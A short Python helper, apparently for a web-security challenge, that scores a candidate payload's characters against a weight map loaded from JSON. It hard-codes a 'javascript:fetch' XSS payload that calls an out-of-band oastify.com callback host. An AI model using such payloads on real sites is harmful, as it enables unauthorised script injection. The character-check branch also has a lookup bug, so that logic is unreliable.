import json
from pathlib import Path
import loguru

WEIGHT_MAP = Path.cwd() / "5compu/level9/weight_map_topic.json"

def load_weight_map() -> dict[str, int | None]:
    return json.loads(WEIGHT_MAP.read_bytes())

def calculate_weight(payload: str, weight_map: dict[str, int | None]) -> int:
    weight = 0
    for character in payload:
        if character in weight_map and weight_map[character] is not None:
            weight += weight_map[character]
        elif weight_map[character] is None:
            print("Char is None weight", character)
        else:
            print("Unknown char", character)
    return weight

def main() -> None:
    weight_map = load_weight_map()
    payload = """javascript:fetch('http://94bqkprxn6o0w8i0mtwrwqhlyc43sugj.oastify.com')"""
    payload = input("Payload: ")
    print(calculate_weight(payload=payload, weight_map=weight_map))
    print(payload)
    print(len(payload))

if __name__ == "__main__":
    main()